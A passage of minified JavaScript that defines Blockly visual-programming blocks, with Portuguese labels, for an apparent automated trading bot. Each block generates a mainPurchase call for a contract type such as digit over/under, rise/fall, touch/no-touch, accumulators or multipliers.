    options: [["Year", "year"], ["Month", "month"], ["Date", "date"], ["Hours", "hours"], ["Minutes", "minutes"], ["Seconds", "seconds"], ["Time Zone", "timezone"], ["Seconds Since Epoch", "secondssinceepoch"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.datetime = function (rs, ru) {
  var rv = rs.getFieldValue("dropdown_datetime");
  var rw;
  switch (rv) {
    case "year":
      rw = "new Date().getFullYear()";
      break;
    case "month":
      rw = "(new Date().getMonth())*1+1";
      break;
    case "date":
      rw = "new Date().getDate()";
      break;
    case "hours":
      rw = "new Date().getHours()";
      break;
    case "minutes":
      rw = "new Date().getMinutes()";
      break;
    case "seconds":
      rw = "new Date().getSeconds()";
      break;
    case "timezone":
      rw = "\"GMT\"+((new Date().getTimezoneOffset())==0 ? \"\" : ((new Date().getTimezoneOffset())<0 ? \"+\" : \"-\")+Math.abs(new Date().getTimezoneOffset()/60))";
      break;
    case "secondssinceepoch":
      rw = "Math.floor(new Date().getTime()/1000)";
      break;
  }
  return [rw, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_diff_match",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Mercado: %5 %6 Stake %7 %8 Duração: ticks (1-10) %9 Previsão: (0-9) %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Differs", "DIGITDIFF"], ["Digit Matches", "DIGITMATCH"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "ldp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_diff_match = function (rx, ry) {
  var rz = rx.getFieldValue("selcontract_nya");
  var sa = rx.getFieldValue("market_nya");
  var sb = sa == "activemarket" ? "mainSymbol" : sa == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + sa.split("|")[0] + "\"";
  var sc = rx.getFieldValue("account_nya");
  var sd = rx.getFieldValue("stakeAM_nya");
  var se = ry.valueToCode(rx, "stake_nya", javascript.Order.ATOMIC);
  if (se.toString().length == 0) {
    se = 1;
  }
  ;
  var sf = ry.valueToCode(rx, "inpduration_nya", javascript.Order.ATOMIC);
  var sg = ry.valueToCode(rx, "ldp_nya", javascript.Order.ATOMIC);
  var sh = "mainPurchase(\"" + sc + "\",\"" + sd + "\"," + se + ",\"" + rz + "\"," + sb + "," + sf + ",\"t\",0,0,0," + sg + ",0,0,0,0,0,0,0,0);";
  return sh;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_over_under",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Mercado: %5 %6 Stake %7 %8 Duração: ticks (1-10) %9 Previsão: (Over:0-8) (Under:1-9) %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Over", "DIGITOVER"], ["Digit Under", "DIGITUNDER"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "ldp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_over_under = function (si, sj) {
  var sk = si.getFieldValue("selcontract_nya");
  var sm = si.getFieldValue("market_nya");
  var sn = sm == "activemarket" ? "mainSymbol" : sm == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + sm.split("|")[0] + "\"";
  var so = si.getFieldValue("account_nya");
  var sp = si.getFieldValue("stakeAM_nya");
  var sq = sj.valueToCode(si, "stake_nya", javascript.Order.ATOMIC);
  if (sq.toString().length == 0) {
    sq = 1;
  }
  ;
  var sr = sj.valueToCode(si, "inpduration_nya", javascript.Order.ATOMIC);
  var ss = sj.valueToCode(si, "ldp_nya", javascript.Order.ATOMIC);
  var su = "mainPurchase(\"" + so + "\",\"" + sp + "\"," + sq + ",\"" + sk + "\"," + sn + "," + sr + ",\"t\",0,0,0,0," + ss + "," + ss + ",0,0,0,0,0,0);";
  return su;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_even_odd",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Mercado: %5 %6 Stake %7 %8 Duração: ticks (1-10) %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Even", "DIGITEVEN"], ["Digit Odd", "DIGITODD"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_even_odd = function (sv, sw) {
  var sx = sv.getFieldValue("selcontract_nya");
  var sy = sv.getFieldValue("market_nya");
  var sz = sy == "activemarket" ? "mainSymbol" : sy == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + sy.split("|")[0] + "\"";
  var ta = sv.getFieldValue("account_nya");
  var tb = sv.getFieldValue("stakeAM_nya");
  var tc = sw.valueToCode(sv, "stake_nya", javascript.Order.ATOMIC);
  if (tc.toString().length == 0) {
    tc = 1;
  }
  ;
  var te = sw.valueToCode(sv, "inpduration_nya", javascript.Order.ATOMIC);
  var tf = "mainPurchase(\"" + ta + "\",\"" + tb + "\"," + tc + ",\"" + sx + "\"," + sz + "," + te + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return tf;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_rise_fall",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Mercado: %5 %6 Stake %7 %8 Duração: %9 %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Rise", "CALL"], ["Fall", "PUT"], ["Rise (or Equals)", "CALLE"], ["Fall (or Equals)", "PUTE"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_rise_fall = function (tg, ti) {
  var tj = tg.getFieldValue("selcontract_nya");
  var tk = tg.getFieldValue("market_nya");
  var tl = tk == "activemarket" ? "mainSymbol" : tk == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + tk.split("|")[0] + "\"";
  var tm = tg.getFieldValue("account_nya");
  var tn = tg.getFieldValue("stakeAM_nya");
  var tq = ti.valueToCode(tg, "stake_nya", javascript.Order.ATOMIC);
  if (tq.toString().length == 0) {
    tq = 1;
  }
  ;
  var tt = tg.getFieldValue("seldurationunit_nya");
  var tu = ti.valueToCode(tg, "inpduration_nya", javascript.Order.ATOMIC);
  var tv = "mainPurchase(\"" + tm + "\",\"" + tn + "\"," + tq + ",\"" + tj + "\"," + tl + "," + tu + ",\"" + tt + "\",\"+0\",0,0,0,0,0,0,0,0,0,0,0);";
  return tv;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_higher_lower",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Mercado: %5 %6 Stake %7 %8 Duração: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Higher", "CALL"], ["Lower", "PUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_higher_lower = function (tw, tx) {
  var ty = tw.getFieldValue("selcontract_nya");
  var tz = tw.getFieldValue("market_nya");
  var ua = tz == "activemarket" ? "mainSymbol" : tz == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + tz.split("|")[0] + "\"";
  var ub = tw.getFieldValue("account_nya");
  var uc = tw.getFieldValue("stakeAM_nya");
  var ud = tx.valueToCode(tw, "stake_nya", javascript.Order.ATOMIC);
  if (ud.toString().length == 0) {
    ud = 1;
  }
  ;
  var ue = tw.getFieldValue("seldurationunit_nya");
  var uf = tx.valueToCode(tw, "inpduration_nya", javascript.Order.ATOMIC);
  var ug = tx.valueToCode(tw, "barrier_nya", javascript.Order.ATOMIC);
  var uh = "mainPurchase(\"" + ub + "\",\"" + uc + "\"," + ud + ",\"" + ty + "\"," + ua + "," + uf + ",\"" + ue + "\"," + ug + ",0,0,0,0,0,0,0,0,0,0,0);";
  return uh;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_touch_notouch",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Mercado: %5 %6 Stake %7 %8 Duração: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Touches", "ONETOUCH"], ["Does Not Touch", "NOTOUCH"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_touch_notouch = function (ui, uj) {
  var ul = ui.getFieldValue("selcontract_nya");
  var um = ui.getFieldValue("market_nya");
  var un = um == "activemarket" ? "mainSymbol" : um == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + um.split("|")[0] + "\"";
  var uq = ui.getFieldValue("account_nya");
  var ur = ui.getFieldValue("stakeAM_nya");
  var ut = uj.valueToCode(ui, "stake_nya", javascript.Order.ATOMIC);
  if (ut.toString().length == 0) {
    ut = 1;
  }
  ;
  var uu = ui.getFieldValue("seldurationunit_nya");
  var uv = uj.valueToCode(ui, "inpduration_nya", javascript.Order.ATOMIC);
  var uw = uj.valueToCode(ui, "barrier_nya", javascript.Order.ATOMIC);
  var ux = "mainPurchase(\"" + uq + "\",\"" + ur + "\"," + ut + ",\"" + ul + "\"," + un + "," + uv + ",\"" + uu + "\"," + uw + ",0,0,0,0,0,0,0,0,0,0,0);";
  return ux;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_endsbetween_endsoutside",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Mercado: %5 %6 Stake %7 %8 Duração: %9 %10 High Barrier Offset: %11 Low Barrier Offset: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Ends Between", "EXPIRYRANGE"], ["Ends Outside", "EXPIRYMISS"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "highbarrier_nya"
  }, {
    type: "input_value",
    name: "lowbarrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_endsbetween_endsoutside = function (uy, uz) {
  var va = uy.getFieldValue("selcontract_nya");
  var vb = uy.getFieldValue("market_nya");
  var vc = vb == "activemarket" ? "mainSymbol" : vb == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + vb.split("|")[0] + "\"";
  var vd = uy.getFieldValue("account_nya");
  var ve = uy.getFieldValue("stakeAM_nya");
  var vf = uz.valueToCode(uy, "stake_nya", javascript.Order.ATOMIC);
  if (vf.toString().length == 0) {
    vf = 1;
  }
  ;
  var vg = uy.getFieldValue("seldurationunit_nya");
  var vh = uz.valueToCode(uy, "inpduration_nya", javascript.Order.ATOMIC);
  var vi = uz.valueToCode(uy, "highbarrier_nya", javascript.Order.ATOMIC);
  var vj = uz.valueToCode(uy, "lowbarrier_nya", javascript.Order.ATOMIC);
  var vk = "mainPurchase(\"" + vd + "\",\"" + ve + "\"," + vf + ",\"" + va + "\"," + vc + "," + vh + ",\"" + vg + "\",0," + vi + "," + vj + ",0,0,0,0,0,0,0,0,0);";
  return vk;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_staysbetween_goesoutside",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Mercado: %5 %6 Stake %7 %8 Duração: %9 %10 High Barrier Offset: %11 Low Barrier Offset: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Stays Between", "RANGE"], ["Goes Outside", "UPORDOWN"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "highbarrier_nya"
  }, {
    type: "input_value",
    name: "lowbarrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_staysbetween_goesoutside = function (vl, vm) {
  var vn = vl.getFieldValue("selcontract_nya");
  var vo = vl.getFieldValue("market_nya");
  var vp = vo == "activemarket" ? "mainSymbol" : vo == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + vo.split("|")[0] + "\"";
  var vq = vl.getFieldValue("account_nya");
  var vr = vl.getFieldValue("stakeAM_nya");
  var vt = vm.valueToCode(vl, "stake_nya", javascript.Order.ATOMIC);
  if (vt.toString().length == 0) {
    vt = 1;
  }
  ;
  var vu = vl.getFieldValue("seldurationunit_nya");
  var vv = vm.valueToCode(vl, "inpduration_nya", javascript.Order.ATOMIC);
  var vw = vm.valueToCode(vl, "highbarrier_nya", javascript.Order.ATOMIC);
  var vx = vm.valueToCode(vl, "lowbarrier_nya", javascript.Order.ATOMIC);
  var vy = "mainPurchase(\"" + vq + "\",\"" + vr + "\"," + vt + ",\"" + vn + "\"," + vp + "," + vv + ",\"" + vu + "\",0," + vw + "," + vx + ",0,0,0,0,0,0,0,0,0);";
  return vy;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_asianup_asiandown",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [5-10] %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Asian Up", "ASIANU"], ["Asian Down", "ASIAND"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_asianup_asiandown = function (vz, wb) {
  var wc = vz.getFieldValue("selcontract_nya");
  var wd = vz.getFieldValue("market_nya");
  var we = wd == "activemarket" ? "mainSymbol" : wd == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + wd.split("|")[0] + "\"";
  var wf = vz.getFieldValue("account_nya");
  var wg = vz.getFieldValue("stakeAM_nya");
  var wh = wb.valueToCode(vz, "stake_nya", javascript.Order.ATOMIC);
  if (wh.toString().length == 0) {
    wh = 1;
  }
  ;
  var wi = wb.valueToCode(vz, "inpduration_nya", javascript.Order.ATOMIC);
  var wj = "mainPurchase(\"" + wf + "\",\"" + wg + "\"," + wh + ",\"" + wc + "\"," + we + "," + wi + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return wj;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_highclose_closelow_highlow",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Duration: minutes [1-30] %9 Multiplier: %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["High-Close", "LBFLOATPUT"], ["Close-Low", "LBFLOATCALL"], ["High-Low", "LBHIGHLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "multiplier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_highclose_closelow_highlow = function (wk, wl) {
  var wm = wk.getFieldValue("selcontract_nya");
  var wn = wk.getFieldValue("market_nya");
  var wo = wn == "activemarket" ? "mainSymbol" : wn == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + wn.split("|")[0] + "\"";
  var wp = wk.getFieldValue("account_nya");
  var wq = wk.getFieldValue("stakeAM_nya");
  var wt = wl.valueToCode(wk, "stake_nya", javascript.Order.ATOMIC);
  if (wt.toString().length == 0) {
    wt = 1;
  }
  ;
  var wu = wl.valueToCode(wk, "inpduration_nya", javascript.Order.ATOMIC);
  var wv = wl.valueToCode(wk, "multiplier_nya", javascript.Order.ATOMIC);
  var ww = "mainPurchase(\"" + wp + "\",\"" + wq + "\"," + wt + ",\"" + wm + "\"," + wo + "," + wu + ",\"m\",0,0,0,0,0,0," + wv + ",0,0,0,0,0);";
  return ww;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_resetcall_resetput",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Reset Call", "RESETCALL"], ["Reset Put", "RESETPUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_resetcall_resetput = function (wx, wy) {
  var wz = wx.getFieldValue("selcontract_nya");
  var xa = wx.getFieldValue("market_nya");
  var xb = xa == "activemarket" ? "mainSymbol" : xa == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + xa.split("|")[0] + "\"";
  var xc = wx.getFieldValue("account_nya");
  var xd = wx.getFieldValue("stakeAM_nya");
  var xe = wy.valueToCode(wx, "stake_nya", javascript.Order.ATOMIC);
  if (xe.toString().length == 0) {
    xe = 1;
  }
  ;
  var xf = wx.getFieldValue("seldurationunit_nya");
  var xg = wy.valueToCode(wx, "inpduration_nya", javascript.Order.ATOMIC);
  var xh = "mainPurchase(\"" + xc + "\",\"" + xd + "\"," + xe + ",\"" + wz + "\"," + xb + "," + xg + ",\"" + xf + "\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return xh;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_hightick_lowtick",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Duration: 5 Ticks %9 Tick Prediction: [1-5] %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["High Tick", "TICKHIGH"], ["Low Tick", "TICKLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "tickprediction_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_hightick_lowtick = function (xi, xj) {
  var xk = xi.getFieldValue("selcontract_nya");
  var xl = xi.getFieldValue("market_nya");
  var xm = xl == "activemarket" ? "mainSymbol" : xl == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + xl.split("|")[0] + "\"";
  var xn = xi.getFieldValue("account_nya");
  var xo = xi.getFieldValue("stakeAM_nya");
  var xp = xj.valueToCode(xi, "stake_nya", javascript.Order.ATOMIC);
  if (xp.toString().length == 0) {
    xp = 1;
  }
  ;
  var xq = xj.valueToCode(xi, "tickprediction_nya", javascript.Order.ATOMIC);
  var xr = "mainPurchase(\"" + xn + "\",\"" + xo + "\"," + xp + ",\"" + xk + "\"," + xm + ",5,\"t\",0,0,0,0,0,0,0," + xq + ",0,0,0,0);";
  return xr;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_onlyups_onlydowns",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [2-5] %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Only Ups", "RUNHIGH"], ["Only Downs", "RUNLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_onlyups_onlydowns = function (xs, xt) {
  var xu = xs.getFieldValue("selcontract_nya");
  var xv = xs.getFieldValue("market_nya");
  var xw = xv == "activemarket" ? "mainSymbol" : xv == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + xv.split("|")[0] + "\"";
  var xx = xs.getFieldValue("account_nya");
  var xy = xs.getFieldValue("stakeAM_nya");
  var xz = xt.valueToCode(xs, "stake_nya", javascript.Order.ATOMIC);
  if (xz.toString().length == 0) {
    xz = 1;
  }
  ;
  var ya = xt.valueToCode(xs, "inpduration_nya", javascript.Order.ATOMIC);
  var yb = "mainPurchase(\"" + xx + "\",\"" + xy + "\"," + xz + ",\"" + xu + "\"," + xw + "," + ya + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return yb;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_accumulatorup",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Growth Rate % [1-5]: %9 Take Profit: %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Accumulator Up", "ACCU"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "selaccumulate_nya"
  }, {
    type: "input_value",
    name: "limittp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_accumulatorup = function (yc, yd) {
  var ye = yc.getFieldValue("selcontract_nya");
  var yf = yc.getFieldValue("market_nya");
  var yg = yf == "activemarket" ? "mainSymbol" : yf == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + yf.split("|")[0] + "\"";
  var yh = yc.getFieldValue("account_nya");
  var yi = yc.getFieldValue("stakeAM_nya");
  var yj = yd.valueToCode(yc, "stake_nya", javascript.Order.ATOMIC);
  if (yj.toString().length == 0) {
    yj = 1;
  }
  ;
  var yk = yd.valueToCode(yc, "selaccumulate_nya", javascript.Order.ATOMIC);
  var yl = yd.valueToCode(yc, "limittp_nya", javascript.Order.ATOMIC);
  var ym = "mainPurchase(\"" + yh + "\",\"" + yi + "\"," + yj + ",\"" + ye + "\"," + yg + ",100,\"t\",0,0,0,0,0,0,0,0," + yk + ",0," + yl + ",0);";
  return ym;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_multiplyup_multiplydown",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Multiplier: %9 %10 Take Profit: %11 Stop Loss: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Multiply Up", "MULTUP"], ["Multiply Down", "MULTDOWN"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "selmultipliermultiply_nya",
